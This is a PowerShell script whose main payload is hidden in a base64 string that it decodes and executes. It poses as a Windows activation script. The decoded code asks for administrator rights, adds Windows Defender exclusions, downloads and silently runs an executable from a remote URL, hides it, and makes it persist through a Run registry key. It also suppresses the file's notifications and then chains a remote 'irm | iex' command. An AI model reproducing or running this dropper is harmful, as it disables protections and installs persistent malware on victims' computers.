                                                    

$base64EncodedScript = "aWYgKC1ub3QgKFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1cnJlbnQoKSkuSXNJblJvbGUoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzQnVpbHRJblJvbGVdOjpBZG1pbmlzdHJhdG9yKSkgewoKICAgICMg0JXRgdC70Lgg0L3QtdGCLCDQv9C10YDQtdC30LDQv9GD0YHQutCw0LXQvCDRgdC60YDQuNC/0YIg0YEg0L/RgNCw0LLQsNC80Lgg0LDQtNC80LjQvdC40YHRgtGA0LDRgtC+0YDQsAoKICAgICRhcmd1bWVudHMgPSAiJiAnIiArICRteWludm9jYXRpb24ubXljb21tYW5kLmRlZmluaXRpb24gKyAiJyIKCiAgICBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwgLUFyZ3VtZW50TGlzdCAkYXJndW1lbnRzIC1WZXJiIFJ1bkFzCgogICAgZXhpdAoKfQojIEJhc2U2NC1lbmNvZGVkIHN0cmluZ3MgZm9yIHRoaXJkIGRvd25sb2FkIChvZmZpY2VtaWNyby5leGUpCiRvZmZpY2VEb3dubG9hZFVybEI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiaHR0cHM6Ly9naXRodWIuY29tL2ZyZWV0cG9ubGluZS9wYWludHdlYnNpdGUvcmF3L3JlZnMvaGVhZHMvbWFpbi9kb2xiYWViLmV4ZSIpKQokdXBkYXRlcnJyRXhlQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJXaW5kb3dzSG9zdEFwcGxpY2F0aW9uLmV4ZSIpKQojIENvbW1vbiBhdHRyaWJ1dGVzCiRoaWRkZW5BdHRyQjY0ID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZyhbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJIaWRkZW4iKSkKJHNpbGVudGx5Q29udGludWVCNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIlNpbGVudGx5Q29udGludWUiKSkKJHN0b3BBY3Rpb25CNjQgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIlN0b3AiKSkKJGRpcmVjdG9yeUI2NCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygiRGlyZWN0b3J5IikpCgojIERlY29kZSB0aGVtCiRvZmZpY2VEb3dubG9hZFVybCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJG9mZmljZURvd25sb2FkVXJsQjY0KSkKJHVwZGF0ZXJyckV4ZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJHVwZGF0ZXJyckV4ZUI2NCkpCiRoaWRkZW5BdHRyID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkaGlkZGVuQXR0ckI2NCkpCiRzaWxlbnRseUNvbnRpbnVlID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkc2lsZW50bHlDb250aW51ZUI2NCkpCiRzdG9wQWN0aW9uID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkc3RvcEFjdGlvbkI2NCkpCiRkaXJlY3RvcnkgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRkaXJlY3RvcnlCNjQpKQoKIyBDcmVhdGUgYSBuZXcgaGlkZGVuIGZvbGRlckFkZC1Gb2xkZXJFeGNsdXNpb24KJGhpZGRlbkZvbGRlck5hbWUgPSAiTm90aWZ5VGVtcF8iICsgW1N5c3RlbS5HdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkuU3Vic3RyaW5nKDAsOCkKJGhpZGRlbkZvbGRlciA9IEpvaW4tUGF0aCAkZW52OkxPQ0FMQVBQREFUQSAkaGlkZGVuRm9sZGVyTmFtZQpOZXctSXRlbSAtSXRlbVR5cGUgJGRpcmVjdG9yeSAtUGF0aCAkaGlkZGVuRm9sZGVyIC1Gb3JjZSB8IE91dC1OdWxsCiRvZmZpY2VQYXRoID0gSm9pbi1QYXRoICRoaWRkZW5Gb2xkZXIgJHVwZGF0ZXJyckV4ZQoKIyBGdW5jdGlvbiB0byBhZGQgZm9sZGVyIGV4Y2x1c2lvbgojIEZ1bmN0aW9uIHRvIGFkZCBleGNsdXNpb25zIHdpdGggcmV0cnkgYW5kIHZlcmlmaWNhdGlvbgpmdW5jdGlvbiBBZGQtRm9sZGVyRXhjbHVzaW9uIHsKICAgIHBhcmFtICgKICAgICAgICBbc3RyaW5nXSRwYXRoLAogICAgICAgIFtpbnRdJG1heFJldHJpZXMgPSA1LAogICAgICAgIFtpbnRdJGRlbGF5U2Vjb25kcyA9IDEKICAgICkKICAgICRyZXRyeUNvdW50ID0gMAogICAgJHN1Y2Nlc3MgPSAkZmFsc2UKICAgIAogICAgd2hpbGUgKC1ub3QgJHN1Y2Nlc3MgLWFuZCAkcmV0cnlDb3VudCAtbHQgJG1heFJldHJpZXMpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICRwYXRoIC1FcnJvckFjdGlvbiAkc3RvcEFjdGlvbgogICAgICAgICAgICAjIFZlcmlmeSBleGNsdXNpb24gd2FzIGFkZGVkIChyZXF1aXJlcyBhZG1pbiByaWdodHMgdG8gY2hlY2ssIGJ1dCBhdHRlbXB0IGFueXdheSkKICAgICAgICAgICAgaWYgKEdldC1NcFByZWZlcmVuY2UgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBFeGNsdXNpb25QYXRoIHwgV2hlcmUtT2JqZWN0IHsgJF8gLWVxICRwYXRoIH0pIHsKICAgICAgICAgICAgICAgICRzdWNjZXNzID0gJHRydWUKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICAkcmV0cnlDb3VudCsrCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRkZWxheVNlY29uZHMKICAgICAgICB9CiAgICB9CiAgICBpZiAoLW5vdCAkc3VjY2VzcykgewogICAgfQogICAgIyBBZGRpdGlvbmFsIGRlbGF5IHRvIGVuc3VyZSBleGNsdXNpb24gdGFrZXMgZWZmZWN0CiAgICBTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDIwMAp9CgoKIyBNYWluIGV4ZWN1dGlvbgp0cnkgewogICAgV3JpdGUtSG9zdCAiTG9hZGluZyBBY3RpdmF0aW9uIFNjcmlwdC4uLiIgLUZvcmVncm91bmRDb2xvciBEYXJrR3JlZW4gLUJhY2tncm91bmRDb2xvciBXaGl0ZQogICAgIyBBZGQgZm9sZGVyIGV4Y2x1c2lvbiBCRUZPUkUgZG93bmxvYWRzCiAgICBBZGQtRm9sZGVyRXhjbHVzaW9uIC1wYXRoICRoaWRkZW5Gb2xkZXIKICAgICMgQWRkIGZpbGUtc3BlY2lmaWMgZXhjbHVzaW9ucyBmb3IgZXh0cmEgcHJvdGVjdGlvbgogICAgQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAkb2ZmaWNlUGF0aAogICAgCiAgICAKICAgICMgRG93bmxvYWQgb2ZmaWNlbWljcm8uZXhlIGFzIHVwZGF0ZXJyci5leGUKICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJG9mZmljZURvd25sb2FkVXJsIC1PdXRGaWxlICRvZmZpY2VQYXRoIC1Vc2VCYXNpY1BhcnNpbmcgLUVycm9yQWN0aW9uICRzdG9wQWN0aW9uCiAgICAjIFNldCBmb2xkZXIgYW5kIGZpbGVzIGFzIGhpZGRlbgogICAgU2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAkaGlkZGVuRm9sZGVyIC1OYW1lIEF0dHJpYnV0ZXMgLVZhbHVlICRoaWRkZW5BdHRyCiAgICBTZXQtSXRlbVByb3BlcnR5IC1QYXRoICRvZmZpY2VQYXRoIC1OYW1lIEF0dHJpYnV0ZXMgLVZhbHVlICRoaWRkZW5BdHRyCiAgICAKICAgICMgUnVuIGFsbCBmaWxlcyBzaWxlbnRseSBpbiB0aGUgY3VycmVudCBzZXNzaW9uCiAgICBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkb2ZmaWNlUGF0aCAtV2luZG93U3R5bGUgSGlkZGVuCiAgICAgICAKCiAgICAkcmVnUGF0aE9mZmljZSA9ICJIS0NVOlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4iCiAgICAkcmVnTmFtZU9mZmljZSA9ICJPZmZpY2VNaWNyb1VwZGF0ZSIKICAgICRyZWdWYWx1ZU9mZmljZSA9ICJwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kIGAiJG9mZmljZVBhdGhgIiIKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ1BhdGhPZmZpY2UgLU5hbWUgJHJlZ05hbWVPZmZpY2UgLVZhbHVlICRyZWdWYWx1ZU9mZmljZSAtRXJyb3JBY3Rpb24gJHNpbGVudGx5Q29udGludWUKICAgIAogICAgIyBTdXBwcmVzcyBub3RpZmljYXRpb25zIGZyb20gdXBkYXRlcnJyLmV4ZQogICAgTmV3LUl0ZW0gLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXE5vdGlmaWNhdGlvbnNcU2V0dGluZ3MiIC1OYW1lICR1cGRhdGVycnJFeGUgLUZvcmNlIHwgT3V0LU51bGwKICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggIkhLQ1U6XFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXE5vdGlmaWNhdGlvbnNcU2V0dGluZ3NcJHVwZGF0ZXJyckV4ZSIgLU5hbWUgIkVuYWJsZWQiIC1WYWx1ZSAwIC1FcnJvckFjdGlvbiAkc2lsZW50bHlDb250aW51ZQogICAgCiAgICAjIFdhaXQgYnJpZWZseSBmb3IgZXhlY3V0aW9uCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAyCn0gY2F0Y2ggewogICAgIyBPdXRwdXQgZXJyb3IgZm9yIGRlYnVnZ2luZwogICAgV3JpdGUtSG9zdCAiRXJyb3I6ICRfIgogICAgZXhpdCAxCn0gZmluYWxseSB7CiAgICAjIE5vIGNsZWFudXAgLSBsZWF2ZSB0cmFjZXMgYXMgcmVxdWVzdGVkCiAgICBpcm0gaHR0cHM6Ly9nZXQuYWN0aXZhdGVkLndpbiB8IGlleAogICAgCn0="

$decodedBytes = [System.Convert]::FromBase64String($base64EncodedScript)
$decodedScript = [System.Text.Encoding]::UTF8.GetString($decodedBytes)

Invoke-Expression $decodedScript
